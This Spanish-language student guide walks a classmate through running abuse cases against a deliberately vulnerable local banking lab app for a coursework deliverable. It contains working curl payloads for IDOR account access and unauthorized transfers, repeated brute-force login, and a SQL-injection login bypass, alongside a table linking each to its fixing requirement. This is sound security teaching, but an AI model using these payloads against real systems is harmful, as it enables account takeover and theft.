# Guía para Edgar — Casos de abuso + Caja Gris/Blanca (Entregable 2, Fase 4)

Hola Edgar. Como vos armaste el STRIDE y los casos de abuso (AB-01 a AB-07) en el
Entregable 1, ahora te toca **ejecutarlos** sobre la app NeoQuetzal-lab y documentar
qué pasó. Es la parte más llamativa del entregable: demostrar los ataques funcionando.

---

## Qué te toca entregar

Un Word (`E2_CasosAbuso_BaArtola.docx`, Arial 12, 1.5, APA) con, por cada prueba:
objetivo, pasos, **captura de evidencia**, resultado y el requisito **RS-xx** que lo corrige.

Priorizá estos cuatro (son los de mayor nivel DREAD):

1. **BOLA/IDOR** — ver y operar cuentas ajenas (AB-02 → T-06/T-07 → R-01, crítico).
2. **Fuerza bruta en login** — sin límite de intentos (AB-01 → T-03 → R-02, crítico).
3. **Exfiltración masiva por paginación** — sacar datos de otra cuenta en bloque.
4. **Inyección SQL en login** — entrar como admin sin contraseña (T-09).

---

## Opción A — Usar la evidencia ya generada (lo más rápido)

En `evidencia/` están los dos archivos que necesitás:

- `evidencia_fase4_ataques.txt` — las 8 pruebas ejecutadas con su resultado real.
- `evidencia_despues_corregida.txt` — las mismas pruebas contra la versión arreglada,
  donde todas **fallan** (sirve para el "antes y después").

Tomás captura de cada bloque y lo pasás a tu documento.

## Opción B — Ejecutarlo vos (caja gris/blanca, con acceso al código)

En una terminal, dentro de `vulnerable/`:
```
npm install
node --experimental-sqlite db.js      # crea la base con datos de prueba
node --experimental-sqlite app.js      # arranca la API en http://localhost:3000
```
En otra terminal, los ataques (podés usar curl, Postman o el navegador):

**Login y robo de token (Juan, dueño de la cuenta 101):**
```
curl -X POST http://localhost:3000/api/login -H "Content-Type: application/json" ^
  -d "{\"usuario\":\"jperez\",\"password\":\"Pollo123\"}"
```
Copiás el `token` que devuelve.

**BOLA — ver la cuenta 104 (que es de Maria, no de Juan):**
```
curl http://localhost:3000/api/accounts/104 -H "Authorization: Bearer EL_TOKEN"
```
Devuelve el saldo de Q1,200,000 de otra persona. Eso es el fallo.

**Transferencia desde la cuenta ajena 104 hacia la de Juan:**
```
curl -X POST http://localhost:3000/api/transfers -H "Authorization: Bearer EL_TOKEN" ^
  -H "Content-Type: application/json" -d "{\"origen\":104,\"destino\":101,\"monto\":500000}"
```

**Fuerza bruta (se repite y nunca bloquea):**
```
curl -X POST http://localhost:3000/api/login -H "Content-Type: application/json" ^
  -d "{\"usuario\":\"jperez\",\"password\":\"otracosa\"}"
```

**Inyección SQL (entrar como admin sin contraseña):**
```
curl -X POST http://localhost:3000/api/login -H "Content-Type: application/json" ^
  -d "{\"usuario\":\"admin'--\",\"password\":\"loquesea\"}"
```

> Si estás en Windows, el `^` es para partir la línea; en Mac/Linux usá `\`.

---

## Tabla resumen (para tu documento)

| Prueba | Caso de abuso | Amenaza / Riesgo | Resultado | RS que lo corrige |
|---|---|---|---|---|
| Ver cuenta ajena | AB-02 | T-06 / R-01 | Accede al saldo de otro cliente | RS-01 |
| Transferir desde cuenta ajena | AB-02 | T-07 / R-01 | Debita una cuenta que no es suya | RS-01 |
| Fuerza bruta login | AB-01 | T-03 / R-02 | La cuenta nunca se bloquea | RS-03 |
| Exfiltración por paginación | AB-06 relac. | T-06 | Extrae todos los movimientos ajenos | RS-01 |
| Inyección SQL login | — | T-09 | Entra como admin sin contraseña | RS-08 |

## El "después" (versión corregida)

En `evidencia_despues_corregida.txt` se ve que, con los controles RS aplicados:
BOLA devuelve **403**, la fuerza bruta se corta con **429**, la inyección SQL ya
no funciona y la paginación queda topada. Incluí una o dos capturas de esto: vale puntos.

Cualquier cosa me avisás. — Jordy
